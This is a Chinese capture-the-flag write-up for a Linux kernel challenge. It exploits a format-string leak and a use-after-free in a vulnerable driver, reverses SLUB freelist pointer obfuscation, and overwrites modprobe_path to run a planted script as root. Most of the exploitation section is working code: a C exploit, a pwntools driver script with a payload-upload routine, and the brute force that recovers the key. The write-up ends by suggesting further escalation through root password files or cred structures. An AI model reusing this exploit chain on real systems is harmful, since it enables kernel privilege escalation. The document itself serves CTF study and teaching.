@@ -1,0 +1,478 @@
+这道题可以通过多种方式提权获得flag。这篇文章的解法更偏向于Glibc那套利用方式，内核任意地址写，并不是预期解，但是衍生出了更多的利用思路，有兴趣的可以自行调试。
+
+# 1.程序分析及漏洞点
+
+这里我们先分析一下程序的逻辑，尝试发现一些可利用的点，收集一些可用的信息。
+
+### 1.1.qemu启动脚本和init脚本
+
+我们首先看看qemu启动脚本：
+
+    
+    
+    qemu-system-x86_64 \  
+    -m 128M \  
+    -kernel bzImage \  
+    -initrd rootfs.img \  
+    -monitor /dev/null \  
+    -append "root=/dev/ram console=ttyS0 oops=panic panic=1 nosmap" \  
+    -cpu kvm64,+smep \  
+    -smp cores=2,threads=2 \  
+    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \  
+    -s \  
+    -nographic
+
+qemu启动脚本里开了smep保护和默认开启的kaslr，用了2个核心，2个线程，那么我们暂且猜想它是一个条件竞争的题目，我们继续往下看init文件：
+
+    
+    
+    #!/bin/sh  
+    ​  
+    mkdir tmp  
+    mount -t proc none /proc  
+    mount -t sysfs none /sys  
+    mount -t devtmpfs devtmpfs /dev  
+    mount -t tmpfs none /tmp  
+    ​  
+    exec 0</dev/console  
+    exec 1>/dev/console  
+    exec 2>/dev/console  
+    ​  
+    echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"  
+    insmod /flying.ko  
+    chmod 666 /dev/seven  
+    chmod 740 /flag  
+    echo 1 > /proc/sys/kernel/kptr_restrict  
+    echo 1 > /proc/sys/kernel/dmesg_restrict  
+    chmod 400 /proc/kallsyms  
+    ​  
+    setsid /bin/cttyhack setuidgid 1000 /bin/sh  
+    ​  
+    umount /proc  
+    umount /sys  
+    umount /tmp  
+    ​  
+    poweroff -d 0  -f
+
+加载了一个flying.ko的驱动文件，并且不允许普通用户使用`dmesg`命令和查看符号地址。在这个脚本里我删除了自动关机的命令，其他都是Linux基本命令就不展开讲了。
+
+### 1.2.flying.ko驱动文件
+
+驱动文件中有四个被绑定的系统调用：
+
+  * open
+    
+        __int64 seven_open()  
+    {  
+    printk(&unk_24B); /* "open()" */  
+    return 0LL;  
+    }
+
+  * close
+    
+        __int64 seven_close()  
+    {  
+    printk(&unk_240); /* "close()" */   
+    return 0LL;  
+    }
+
+  * write：主要功能是从用户态拷贝数据到内核堆块中，对大小有限制。拷贝过程中有个0x80大小的偏移，也就是说我们写入的结尾位置不变
+    
+        unsigned __int64 __fastcall seven_write(__int64 fd, __int64 user, unsigned __int64 size)  
+    {  
+    if ( sctf_buf )  
+    {  
+    if ( size <= 0x80 )  
+    {  
+    printk(&unk_28D); /* "write()" */  
+    copy_from_user(sctf_buf + 128LL - size, user, size);  
+    }  
+    }  
+    else  
+    {  
+    printk("What are you doing?");  
+    }  
+    return size;  
+    }
+
+  * ioctl：主逻辑函数，主要实现三个功能：申请堆块、释放堆块、打印堆块内容。对堆块申请的大小有限制，必须为0x80大小；打印功能有格式化字符串漏洞；释放功能有UAF。
+    
+        __int64 __fastcall seven_ioctl(__int64 fd, __int64 command, __int64 size)  
+    {  
+    switch ( (_DWORD)command )  
+    {  
+    case 0x6666:  
+    if ( sctf_buf )  
+    {  
+    kfree(sctf_buf);  
+    return 0LL;  
+    }  
+    else  
+    {  
+    printk("What are you doing?");  
+    return -1LL;  
+    }  
+    case 0x7777:  
+    if ( sctf_buf )  
+    printk(sctf_buf);  
+    return 0LL;  
+    case 0x5555:  
+    if ( size == 0x80 )  
+    {  
+    sctf_buf = kmem_cache_alloc_trace(kmalloc_caches[7], 0xCC0LL, 0x80uLL);  
+    printk("Add Success!\n");  
+    }  
+    else  
+    {  
+    printk("It's not that simple\n");  
+    }  
+    return 0LL;  
+    default:  
+    return -1LL;  
+    }  
+    }
+
+另外两个函数，init和exit暂时不用关注，就是加载和卸载模块的函数。
+
+### 1.3.漏洞点总结
+
+分析完整体程序之后，我们有如下可用的漏洞点：
+
+  * 可能会有条件竞争漏洞可以利用。事实也是如此，预期解就是利用条件竞争提权。
+
+  * 格式化字符串漏洞：可以用于泄露内核数据。不过这个格式化字符串利用方式和用户态还不太一样，后面我们会讲到。
+
+  * UAF漏洞：在释放后可泄露堆中内容，里面存储了堆指针；并且可以往释放的堆块写入数据，修改堆指针。
+
+# 2.利用过程
+
+### 2.1.内核堆分配和释放过程
+
+这里只讲用到的两个函数，`kfree`和`kmem_cache_alloc_trace`的实现过程，函数源码自行查看。
+
+  * `kmem_cache_alloc_trace`：分配堆块并返回指针
+    
+        void *kmem_cache_alloc_trace(struct kmem_cache *s, gfp_t gfpflags, size_t size)
+
+`gfpflags`和`size`分别是gfp标志和分配大小。`kmem_cache`是一个非常重要的结构体，这里给出在gdb中打印的内容更好观察，只介绍一些用到的成员信息：
+
+    
+        gef➤  print *(struct kmem_cache*)0xffff888007003340  
+    $1 = {  
+    cpu_slab = 0x310e0, /* 这个偏移加上GS段的基地址，就是内核管理的堆链表 */  
+    ......  
+    size = 0x80,        /* 当前的堆块大小 */  
+    ......  
+    offset = 0x40,      /* 堆指针加offset就是fd的存储位置 */  
+    ......  
+    name = 0xffffffff823cc2d8 "kmalloc-128", /* 当前堆块的名称，仅用于输出信息 */  
+    ......  
+    random = 0xbb3caa4ce9bb6c4, /* 用于混淆堆指针的随机数，每个机器的random都不同 */  
+    ......  
+    }
+
+  * `kfree`：函数定义`void kfree(const void *x)`。它接收一个即将释放的堆指针。在释放时，会将链表指针混淆后，放入堆指针加0x40的位置（不同的`kmem_cache`对象大小不同，这个值存放的位置也有差异，这里是以我们用到的kmalloc-128举例），具体的混淆算法如下：
+
+    1. 当前即将释放的堆地址为A，加上存放的位置偏移，即加上0x40，得到B
+
+    2. 将B通过`bswap`指令字节反转，得到C
+
+    3. 然后拿C异或随机数，再异或堆链表的下一堆块指针D，最后得到结果E，将E存储于B位置处，释放过程完成
+
+    4. 最后得到等式：`bswap(A+0x40) ^ random ^ D = E`，这个E就是存储在堆块中的看起来很奇怪的值
+
+    5. 我们申请堆块时，是释放时混淆指针的逆过程，最后得到目的指针并返回给用户
+
+这里用一个例子来举例：
+
+    
+        A = 0xffff888005936180  
+    random = 0x0bb3caa4ce9bb6c4  
+    D = 0xffff888005936580  
+    ​  
+    套用混淆公式：  
+    bswap(0xffff888005936580 + 0x40) ^ 0x0bb3caa4ce9bb6c4 ^ 0x0bb3caa4ce9bb6c4 = 0x342dd1214b802cbb  
+    ​  
+    最后写入混淆后的链表指针：  
+    *(0xffff888005936180 + 0x40) = 0x342dd1214b802cbb
+
+### 2.2.泄露信息
+
+由于这题没有`copy_to_user`函数，无法直接泄露，我们可以考虑用`printk`泄露信息。经过调试得知，`printk`会对字符串进行检查，如果包含有`%`字符，那么和`printf`函数一样打印信息，但不允许使用`%2$p`这种格式化字符串，否则会调用`ud2`指令产生中断，然后打印发生错误时的内核态和用户态寄存器内容，但是这种信息泄露只会发生一次，第二次再输入`%2$p`不会再输出这种信息了。搞笑的是，发现这个信息泄露的原因竟然是我写错了C代码，不小心把`%2$p`写成了`%2p`哈哈哈，其实效果也一样的。打印的内容大致如下：![1641522247_61d7a447c75fea8afb945.png!small?1641522249133](https://image.3001.net/images/20220107/1641522247_61d7a447c75fea8afb945.png!small?1641522249133)
+
+可以看到这里面有很多可用的信息，比如RBP寄存器可以得知栈地址，R13可以得知分配的堆地址，R15可以得知内核代码地址从而算出内核基地址，还有非常有用的GS段基地址。GS段里面存储了很多信息，堆链表、一些重要结构体，还包括当前这个泄露的信息内容。上面的寄存器是内核态的寄存器信息，而下面的就是用户态的信息了。
+
+堆链表指针就可以直接像Glibc的UAF那样直接泄露即可。
+
+关于如何接受数据，我尝试过使用`dup2`将控制台信息输出到文件，然后读取文件得到泄露信息，但是并不能得到内容。也试过使用监视进程的方式去获取控制台输出，也没成功。后面就考虑用python的pwntools去接收数据了。但是带来的问题就是接收的数据有时候并不准确，接受到的部分数据会断掉，所以运气不好的时候需要多次尝试。
+
+### 2.3.解密混淆的链表指针
+
+我们知道了`kfree`加密链表指针的方式，但是有个问题，因为这个格式化字符串只能使用一次，所以我们只知道被混淆后的值和当前堆地址，而不知道随机数和下一个堆地址（因为内核堆不像Glibc那样顺序分配，它们的位置是不连续的）。其实可以反过来想，当前堆地址会在上一次`kfree`时用到，我们可以先泄露上一个被混淆的值fd1，然后再当前被混淆的值fd2和当前的堆地址，通过爆破比较，就可以算出随机数的值和fd1的地址。python代码如下：
+
+    
+    
+    bswap_addr = bswap(heap_pointer + 0x40)  
+    key_list = []  
+    for i in range(0x80,0x1000,0x80):  
+    next_heap = heap_pointer + i  
+    xor_key = fd2 ^ next_heap ^ bswap_addr  
+    key_list.append(xor_key)  
+    ​  
+    heap_1_pointer = 0  
+    xor_key = 0  
+    for k in key_list:  
+    v = k ^ fd1 ^ heap_pointer  
+    if (v & 0xffffffffffff) == (0xffffffffffff & bswap_addr):  
+    xor_key = k  
+    print "xor_key : ", hex(xor_key)  
+    heap_1_pointer = bswap(v) - 0x40  
+    print "fd1 address : ",hex(heap_1_pointer)  
+    break  
+    else:  
+    continue
+
+### 2.4.利用过程
+
+首先通过UAF和格式化字符串，得到当前堆地址，并算出随机数的值。这个值不用担心会变化（至少我调试的时候从未变化过，而且打远程的时候也没看到变化过，猜测每个机器的随机值都不一样，且不会轻易发生变化），之后利用UAF修改堆指针，改成我们伪造的混淆值，那么在重新申请堆块时，就会申请到我们的目的地址。这时候有两种思路：
+
+  * 修改`modprobe_path`，执行`shell`脚本读取flag。这也是最简单粗暴的读取flag的方式，有点“硬打”的味道
+
+  * 申请到栈上，构造ROP链，执行`commit_creds(prepare_kernel_cred(0))`提权。麻烦的地方在于申请的堆块内容会被清零，需要找好位置。没有符号地址可以通过IDA查看。
+
+# 3.利用脚本
+
+我是修改`modprobe_path`来读取flag文件的利用方式，至于ROP的攻击方式大家可以自己尝试一下。这个方式利用脚本分为两部分，一部分用C写的，编译后重新打包放在内核文件系统中；另一部分用于接受泄露的信息和交互的python脚本
+
+先看C的代码：
+
+    
+    
+    #include <stdio.h>  
+    #include <stdlib.h>  
+    #include <unistd.h>  
+    #include <sys/ioctl.h>  
+    #include <string.h>  
+    #include <sys/stat.h>  
+    #include <fcntl.h>  
+    #include <sys/mman.h>  
+    #include <poll.h>  
+    #include <pthread.h>  
+    #include <errno.h>  
+    #include <signal.h>  
+    #include <sys/syscall.h>  
+    #include <sys/types.h>  
+    #include <pthread.h>  
+    #include <poll.h>  
+    #include <sys/prctl.h>  
+    #include <stdint.h>  
+    #include <pty.h>  
+    ​  
+    void delete(int fd){  
+    ioctl(fd,0x6666);  
+    }  
+    ​  
+    void show(int fd){  
+    ioctl(fd,0x7777);  
+    }  
+    ​  
+    void add(int fd){  
+    ioctl(fd,0x5555,0x80);  
+    }  
+    ​  
+    int main()  
+    {  
+    unsigned char cpu_mask = 0x01;  
+    sched_setaffinity(0, 1, &cpu_mask);  
+    int fd = open("/dev/seven",2);  
+    char buf[0x80]={0};  
+    ​  
+    add(fd);  
+    memset(buf,'A',0x40);  
+    write(fd,buf,0x80);  
+    delete(fd);  
+    show(fd);  
+    ​  
+    add(fd);  
+    add(fd);  
+    memcpy(buf,"%2$p",0x5);    
+    write(fd,buf,0x80);  
+    show(fd);  
+    memcpy(buf,"%px\n%px\n%px\n%px\n%px\nAAAAAAAAAAAAAAAA%px\n%px\nBBBBBBBBBBBBBBBB%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n%px\n",0x80);    
+    write(fd,buf,0x80);  
+    delete(fd);  
+    show(fd);  
+    ​  
+    add(fd);  
+    puts("input fd : ");  
+    unsigned long long m = 0;  
+    scanf("%llu",&m);  
+    printf("%llx\n",m);  
+    ​  
+    unsigned long long buf2[10]={0};  
+    for (int i = 0; i < 8; i++)  
+    {  
+    buf2[i]=0x6161616161616161;  
+    }  
+    buf2[8] = m;  
+    buf2[9] = m;  
+      
+    memcpy(buf,buf2,0x50);  
+    delete(fd);  
+    write(fd,buf,0x80);  
+      
+    puts("alloc begining....");  
+    add(fd);  
+    add(fd);  
+    char modprobe_path[0x80] = {0};  
+    strcpy(modprobe_path,"/home/pwn/copy.sh\0");  
+    write(fd,modprobe_path,0x80);  
+    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");  
+    system("chmod +x /home/pwn/copy.sh");  
+    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/sir");  
+    system("chmod +x /home/pwn/sir");  
+    return 0;  
+    ​  
+    }
+
+然后是python的交互脚本：
+
+    
+    
+    #!/usr/bin/python  
+    from pwn import *  
+    ​  
+    context.log_level='debug'  
+    ​  
+    def exec_cmd(cmd):  
+    io.recvuntil("$ ")  
+    io.sendline(cmd)  
+    ​  
+    # 打远程用的上传函数  
+    def upload():  
+    with open("./exp", "rb") as f:  
+    encoded = base64.b64encode(f.read())  
+    for i in range(0, len(encoded), 1000):  
+    exec_cmd("echo \"%s\" >> benc" % (encoded[i:i+1000]))  
+      
+    ​  
+    # io = remote(HOST,PORT)  
+    io = process("/bin/sh")  
+    io.sendline('./boot.sh')  
+    # exec_cmd("cd /tmp")  
+    # upload()  
+    # exec_cmd("cat benc | base64 -d > exp")      
+    # exec_cmd("chmod +x exp")  
+    exec_cmd("./exp")    
+    ​  
+    junk = io.recvuntil('write()')  
+    io.recvuntil('A'*0x40)  
+    fd1 = u64(io.recv(8))  
+    print 'fd 1: ',hex(fd1)  
+    ​  
+    io.recvuntil('R13: ')  
+    heap_pointer = int(io.recv(16),16)  
+    print 'heap_pointer: ',hex(heap_pointer)  
+    ​  
+    io.recvuntil('R15: ')  
+    offset = 0xffffffff82fa7d80-0xffffffff81000000  
+    kernel_base = int(io.recv(16),16) - offset  
+    print "kernel_base:",hex(kernel_base)  
+    ​  
+    io.recvuntil('write()')  
+    io.recvuntil('B'*16)  
+    io.recv(0x21)  
+    fd2 = u64(io.recv(8))  
+    print "fd 2: ",hex(fd2)  
+    ​  
+    def bswap(target):  
+    bswap_address = ''  
+    for i in range(8):  
+    k = (target >> (8*i)) & 0xff  
+    bswap_address += "%02x"%k  
+    bswap_addr = eval('0x'+bswap_address)  
+    return bswap_addr  
+    ​  
+    bswap_addr = bswap(heap_pointer + 0x40)  
+    ​  
+    key_list = []  
+    for i in range(0x80,0x1000,0x80):  
+    next_heap = heap_pointer + i  
+    xor_key = fd2 ^ next_heap ^ bswap_addr  
+    key_list.append(xor_key)  
+    ​  
+    heap_1_pointer = 0  
+    xor_key = 0  
+    for k in key_list:  
+    v = k ^ fd1 ^ heap_pointer  
+    if (v & 0xffffffffffff) == (0xffffffffffff & bswap_addr):  
+    xor_key = k  
+    print "xor_key : ", hex(xor_key)  
+    heap_1_pointer = bswap(v) - 0x40  
+    print "fd1 address : ",hex(heap_1_pointer)  
+    break  
+    else:  
+    continue  
+    ​  
+    modprobe_path = kernel_base+(0xffffffff82a63b00 - 0xffffffff81000000)  
+    ​  
+    info(hex(modprobe_path))  
+    fd3 = xor_key ^ bswap_addr ^ modprobe_path  
+    print hex(fd3)  
+    print fd3  
+    io.recvuntil('input fd : ')  
+    raw_input()  
+    io.sendline(str(fd3))  
+    ​  
+    io.interactive()
+
+我得到的random数值是这样的，我无论是重启还是关闭虚拟机，它都从未变动过，所以这个random值在python交互脚本没有接收完全的时候我一眼就看出来了，这种情况就得重新跑脚本，不过概率还是挺大的，多跑两次就能正确了：
+
+![1641522290_61d7a472a088cf805ecc0.png!small?1641522291022](https://image.3001.net/images/20220107/1641522290_61d7a472a088cf805ecc0.png!small?1641522291022)
+
+最后在命令行运行sir程序，然后查看flag：
+
+    
+    
+    ls -la /home/pwn/flag  
+    /home/pwn/sir  
+    cat /home/pwn/flag
+
+![1641522307_61d7a4837c18cf06bc3d4.png!small?1641522307809](https://image.3001.net/images/20220107/1641522307_61d7a4837c18cf06bc3d4.png!small?1641522307809)
+
+# 4.攻击面拓展
+
+  * 我们可以以root权限执行`modprobe_path`内的文件，还可以修改root权限下的文件内容，那么可不可以直接修改关于root密码配置的文件进行登录？或者修改系统关键配置文件？
+
+  * 既然可以任意地址写入，可以修改一些重要的数据结构之类的，比如`cred`结构体或其他的。但我也是刚接触内核不久，知识储备不是很足，还需要多了解内核的数据结构才能搞清楚，但应该可以有很多的利用方式。
+
+  * 在调试过程中，发现一个好玩的gadget，但是估计在本题中无法使用。类似于`setcontext`利用链，设置了许多有用的寄存器，可以在堆里面布置ROP。下面是代码自行体会：
+    
+        0xffffffff81b6301e <restore_registers+30>:mov    cr4,rax  
+    0xffffffff81b63021 <restore_registers+33>:mov    rax,0xffffffff831a6c60          # 这是一个数据段地址，内容为空  
+    0xffffffff81b63028 <restore_registers+40>:mov    rsp,QWORD PTR [rax+0x98]  
+    0xffffffff81b6302f <restore_registers+47>:mov    rbp,QWORD PTR [rax+0x20]  
+    0xffffffff81b63033 <restore_registers+51>:mov    rsi,QWORD PTR [rax+0x68]  
+    0xffffffff81b63037 <restore_registers+55>:mov    rdi,QWORD PTR [rax+0x70]  
+    0xffffffff81b6303b <restore_registers+59>:mov    rbx,QWORD PTR [rax+0x28]  
+    0xffffffff81b6303f <restore_registers+63>:mov    rcx,QWORD PTR [rax+0x58]  
+    0xffffffff81b63043 <restore_registers+67>:mov    rdx,QWORD PTR [rax+0x60]  
+    0xffffffff81b63047 <restore_registers+71>:mov    r8,QWORD PTR [rax+0x48]  
+    0xffffffff81b6304b <restore_registers+75>:mov    r9,QWORD PTR [rax+0x40]  
+    0xffffffff81b6304f <restore_registers+79>:mov    r10,QWORD PTR [rax+0x38]  
+    0xffffffff81b63053 <restore_registers+83>:mov    r11,QWORD PTR [rax+0x30]  
+    0xffffffff81b63057 <restore_registers+87>:mov    r12,QWORD PTR [rax+0x18]  
+    0xffffffff81b6305b <restore_registers+91>:mov    r13,QWORD PTR [rax+0x10]  
+    0xffffffff81b6305f <restore_registers+95>:mov    r14,QWORD PTR [rax+0x8]  
+    0xffffffff81b63063 <restore_registers+99>:mov    r15,QWORD PTR [rax]  
+    0xffffffff81b63066 <restore_registers+102>:push   QWORD PTR [rax+0x90]  
+    0xffffffff81b6306c <restore_registers+108>:popf  
+    0xffffffff81b6306d <restore_registers+109>:lgdt   [rax+0x10b]                     # 加载gdt表，会不会引起内核崩溃还需要调试才能得知  
+    0xffffffff81b63074 <restore_registers+116>:xor    eax,eax  
+    0xffffffff81b63076 <restore_registers+118>:mov    QWORD PTR [rip+0x13c5f83],rax        # 0xffffffff82f29000 <in_suspend>  
+    0xffffffff81b6307d <restore_registers+125>:ret
+
+# 总结
+
+通过这个题目，我把`kfree`函数和`kmem_cache_alloc_trace`这两个函数都调试烂了，学到了很多东西。不过在其他的攻击方向还没有尝试过，接下来会研究一下这部分内容，尝试更多的利用手法。
+
